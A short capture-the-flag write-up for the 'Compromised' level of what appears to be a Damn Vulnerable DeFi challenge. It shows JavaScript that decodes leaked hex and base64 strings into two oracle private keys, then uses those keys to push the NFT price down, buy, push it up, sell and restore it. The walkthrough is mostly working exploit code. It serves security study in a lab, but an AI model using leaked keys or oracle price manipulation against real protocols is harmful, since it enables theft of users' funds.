# Compromised

1. It is seems obvious that we have to do something with the given snippet, after you convert the bytes to string, and decode it with base64, you will get private keys of two oracle provider.

```javascript
var bytes1 =
  "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
var bytes2 =
  "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34";

var arrayBytes1 = bytes1.split(" ");
var arrayBytes2 = bytes2.split(" ");

const toString = (bytes) => {
  var result = "";
  for (var i = 0; i < bytes.length; ++i) {
    const byte = bytes[i];
    const text = byte.toString(16);
    result += (byte < 16 ? "%0" : "%") + text;
  }
  return decodeURIComponent(result);
};

// compromised keys
privateKey1 = Buffer.from(toString(arrayBytes1), "base64").toString();
privateKey2 = Buffer.from(toString(arrayBytes2), "base64").toString();

let source1 = new ethers.Wallet(privateKey1, ethers.provider);
let source2 = new ethers.Wallet(privateKey2, ethers.provider);
```

2. Since the NFT price is based on median from providers, and we have two of them, set the price as low as possible, buy the NFT, set it to high, then sell it. Don't forget to set the price back to normal again since the test require you to do so.

```javascript
/** CODE YOUR EXPLOIT HERE */
await this.oracle
  .connect(source1)
  .postPrice("DVNFT", ethers.utils.parseEther("0.0001"));
await this.oracle
  .connect(source2)
  .postPrice("DVNFT", ethers.utils.parseEther("0.0001"));
// buy after the price is changed
var tx = await this.exchange
  .connect(attacker)
  .buyOne({ value: ethers.utils.parseEther("0.0001") });
const rc = await tx.wait();
var tokenId = rc.events[1].args.tokenId.toString();
// change the price again
await this.oracle
  .connect(source1)
  .postPrice("DVNFT", ethers.utils.parseEther("9990.0001"));
await this.oracle
  .connect(source2)
  .postPrice("DVNFT", ethers.utils.parseEther("9990.0001"));
// approve the nft to exchange, sell with high price
await this.nftToken.connect(attacker).approve(this.exchange.address, tokenId);
await this.exchange.connect(attacker).sellOne(tokenId);
// change back to initial price
await this.oracle
  .connect(source1)
  .postPrice("DVNFT", ethers.utils.parseEther("999"));
await this.oracle
  .connect(source2)
  .postPrice("DVNFT", ethers.utils.parseEther("999"));
```
